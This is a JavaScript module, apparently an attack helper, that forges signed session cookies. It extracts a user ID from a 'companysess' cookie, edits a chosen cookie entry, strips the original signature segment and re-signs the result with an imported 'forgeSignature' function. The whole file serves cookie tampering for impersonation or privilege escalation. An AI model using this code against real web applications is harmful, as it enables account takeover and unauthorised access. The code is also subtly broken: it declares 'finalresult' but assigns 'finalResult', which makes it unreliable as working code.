const { forgeSignature } = require('./encryption');
exports.parseUIDFromCookies = cookies => {
  for (let i = 0; i < cookies.length; i++) {
    if (cookies[i].name == 'companysess') {
      const foundPointer = cookies[i].value.search('userid');
      const length = 'userid=5f1543f199b73d1c53b943c6'.length;
      const uidField = cookies[i].value.substring(
        foundPointer,
        foundPointer + length
      );
      return uidField.substring('userid='.length);
    }
  }
};

exports.editSpecificCookieEntry = (cookie, cookieToModify, newValue) => {
  const cookieSeparator = '&';
  const cooassign = '=';
  const cookieToFind = cookieToModify;
  const cookieArray = cookie.split(cookieSeparator);

  let finalresult = '';

  for (let j = 0; j < cookieArray.length; j = j + 1) {
    let currentCookie = cookieArray[j];
    let cookieToAdd = currentCookie;

    if (currentCookie.includes(cookieToFind)) {
      const [cookey, cooval, ...rest] = currentCookie.split(cooassign);
      cookieToAdd = `${cookey}${cooassign}${newValue}`;
    }

    if (j === 0) {
      finalResult = cookieToAdd;
    } else {
      finalResult = finalResult + cookieSeparator + cookieToAdd;
    }
  }

  return finalResult;
};

exports.cutOutFirstPartOfCookie = cookie => {
  const cookieArray = cookie.split('-');
  let finalresult = '';
  for (let j = 1; j < cookieArray.length; j = j + 1) {
    if (j === 1) {
      finalResult = cookieArray[j];
    } else {
      finalResult = finalResult + '-' + cookieArray[j];
    }
  }
  return finalResult;
};

exports.tamperWithCookie = (cookie, cookieToUpdate, cookieValue) => {
  const removeFirstPart = this.cutOutFirstPartOfCookie(cookie);
  const modifySessionType = this.editSpecificCookieEntry(
    removeFirstPart,
    cookieToUpdate,
    cookieValue
  );

  const modifySignature = forgeSignature(modifySessionType);
  return `${modifySignature}-${modifySessionType}`;
};
